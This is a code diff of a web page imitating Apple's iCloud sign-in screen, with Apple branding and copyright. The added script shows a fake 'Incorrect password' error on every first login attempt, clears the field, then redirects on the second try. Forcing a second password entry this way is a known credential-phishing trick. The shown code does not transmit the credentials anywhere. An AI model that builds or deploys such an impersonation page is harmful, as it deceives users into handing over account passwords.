@@ -5,45 +5,44 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="style.css">
     <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
-    <link rel="icon" href="ICO/favicon-16x16.png">
     <title>Sign in - iCloud</title>
 </head>
 <body>
     <header><nav><a href="index.html" class="icloud-logo"><i class='bx bxl-apple'></i>iCloud</a></nav></header>
+    
     <main id="main">
         <form id="sign-in">
-            <!-- STEP 1: EMAIL -->
-            <div class="step active" id="step1">
+            <div class="error-message" id="errorMsg"></div>
+            
+            <div class="login-form">
                 <img id="apple-color-logo" src="IMG/sign-in-screen-img.svg" alt="Apple">
-                <p>Sign in with your Apple ID</p>
-                <div class="input-container">
+                <p id="loginTitle">Sign in with your Apple ID</p>
+                
+                <div class="input-group">
                     <input id="email-phone" type="email" placeholder="Email or phone number" required>
                     <i class='bx bx-right-arrow-circle'></i>
                 </div>
-            </div>
-
-            <!-- STEP 2: PASSWORD -->
-            <div class="step" id="step2" style="display:none;">
-                <img id="apple-color-logo" src="IMG/sign-in-screen-img.svg" alt="Apple">
-                <p>Enter your password</p>
-                <div class="input-container">
-                    <input id="password" type="password" placeholder="Password" required>
+                
+                <div class="input-group password-field" id="passwordField">
+                    <input id="password" type="password" placeholder="Password">
                     <i class='bx bx-lock-alt'></i>
                 </div>
-                <button type="submit" class="submit-btn">Sign In</button>
+                
+                <button type="submit" class="submit-btn" id="submitBtn">Sign In</button>
             </div>
-
+            
             <div class="login-options">
                 <label class="checkbox-label">
                     <input type="checkbox" id="check"> Keep me signed in
                 </label>
                 <div class="links">
-                    <a href="#" class="forgot-link">Forgot Apple ID or password?</a>
-                    <a href="#" class="create-link">Create Apple ID</a>
+                    <a href="#">Forgot Apple ID or password?</a>
+                    <a href="#">Create Apple ID</a>
                 </div>
             </div>
         </form>
     </main>
+    
     <footer>
         <div class="footer-div">
             <span>System Status</span><div class="sep"></div>
@@ -52,8 +51,70 @@
         </div>
         <div class="footer-div copyright">© 2024 Apple Inc. All rights reserved.</div>
     </footer>
+
     <script>
-        document.addEventListener('DOMContentLoaded',()=>{const e=document.getElementById('email-phone'),t=document.getElementById('step2'),n=document.getElementById('step1'),o=document.querySelector('.bx-right-arrow-circle'),r=document.getElementById('sign-in');o.addEventListener('click',e=>{e.preventDefault(),e.target.closest('.input-container').querySelector('input').value.trim()?(()=>{n.style.display='none',t.style.display='flex',t.classList.add('active'),setTimeout(()=>{document.getElementById('password').focus()},300)})(): (e.target.closest('input').focus(),setTimeout(()=>{e.target.closest('input').placeholder='Email or phone number'},1500))}),e.addEventListener('keypress',e=>{'Enter'===e.key&&e.target.value.trim()&&(()=>{n.style.display='none',t.style.display='flex',t.classList.add('active'),setTimeout(()=>{document.getElementById('password').focus()},300)})()}),r.addEventListener('submit',e=>{e.preventDefault();const t=document.getElementById('password').value;t?(alert('✅ ¡Login exitoso! Bienvenido a iCloud.'),window.location.href='index.html'):(alert('❌ Ingresa tu contraseña'),document.getElementById('password').focus())})});
+        let loginAttempts = 0;
+        const maxAttempts = 2;
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            const emailInput = document.getElementById('email-phone');
+            const arrowIcon = document.querySelector('.bx-right-arrow-circle');
+            const passwordField = document.getElementById('passwordField');
+            const passwordInput = document.getElementById('password');
+            const submitBtn = document.getElementById('submitBtn');
+            const loginTitle = document.getElementById('loginTitle');
+            const errorMsg = document.getElementById('errorMsg');
+            const form = document.getElementById('sign-in');
+            
+            // Click flecha o Enter → mostrar password
+            const showPassword = () => {
+                if (emailInput.value.trim()) {
+                    passwordField.classList.add('show');
+                    submitBtn.classList.add('show');
+                    setTimeout(() => passwordInput.focus(), 300);
+                } else {
+                    emailInput.focus();
+                }
+            };
+            
+            arrowIcon.addEventListener('click', showPassword);
+            emailInput.addEventListener('keypress', e => {
+                if (e.key === 'Enter' && emailInput.value.trim()) {
+                    showPassword();
+                }
+            });
+            
+            // Submit
+            form.addEventListener('submit', e => {
+                e.preventDefault();
+                loginAttempts++;
+                
+                const email = emailInput.value.trim();
+                const password = passwordInput.value.trim();
+                
+                if (!email || !password) {
+                    showError('Please enter both email and password');
+                    return;
+                }
+                
+                if (loginAttempts < maxAttempts) {
+                    showError('Incorrect password. Try again.');
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                } else {
+                    // Éxito en 2do intento
+                    setTimeout(() => {
+                        window.location.href = 'index.html';
+                    }, 800);
+                }
+            });
+            
+            function showError(message) {
+                errorMsg.textContent = message;
+                errorMsg.classList.add('show');
+                setTimeout(() => errorMsg.classList.remove('show'), 3000);
+            }
+        });
     </script>
 </body>
 </html>
